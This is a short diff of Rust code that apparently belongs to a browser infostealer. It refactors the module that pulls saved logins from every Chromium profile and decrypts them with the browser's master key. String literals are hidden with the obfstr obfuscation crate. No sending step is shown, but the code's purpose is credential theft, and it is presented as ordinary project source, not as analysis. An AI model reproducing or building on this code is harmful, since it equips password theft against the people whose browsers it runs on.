@@ -2,12 +2,12 @@ use alloc::borrow::ToOwned;
 use alloc::boxed::Box;
 use alloc::sync::Arc;
 use alloc::vec::Vec;
-use sqlite::{TableRecord, TableRecordExtension};
 use tasks::{parent_name, Task};
 use utils::path::Path;
 use crate::chromium::Browser;
 use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, Password};
 use obfstr::obfstr as s;
+use database::TableRecord;
 use utils::browsers::chromium::decrypt_data;
 
 const LOGINS_ORIGIN_URL: usize = 0;
@@ -49,7 +49,7 @@ fn read_passwords(profile: &Path, master_key: &[u8]) -> Option<Vec<Password>> {
     )
 }
 
-fn extract_password_from_record(record: &Box<dyn TableRecord>, master_key: &[u8]) -> Option<Password> {
+fn extract_password_from_record(record: &dyn TableRecord, master_key: &[u8]) -> Option<Password> {
     let origin = record
         .get_value(LOGINS_ORIGIN_URL)
         .and_then(|value| value.as_string())
